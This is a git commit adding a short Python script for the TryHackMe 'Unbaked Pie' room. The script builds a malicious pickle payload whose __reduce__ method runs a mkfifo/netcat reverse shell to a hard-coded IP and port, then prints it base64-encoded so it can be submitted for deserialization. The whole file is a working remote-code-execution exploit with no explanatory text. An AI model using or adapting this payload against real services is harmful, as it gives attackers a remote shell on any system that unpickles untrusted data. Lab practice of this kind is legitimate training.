924acd7af45f719b8d054b341271ed1656f34554
CyberLola <82300922+CyberLola@users.noreply.github.com>
2021-06-24 02:56:42 +0000

    Create unbakedpie.py

---
+++ unbakedpie.py
@@ -0,0 +1,15 @@
+#script for reverse shell on TryHackMe room Unbaked Pie
+
+#!/usr/bin/env python3
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.4.31.108 7777 > /tmp/f') #change IP
+        return os.system, (cmd,)
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
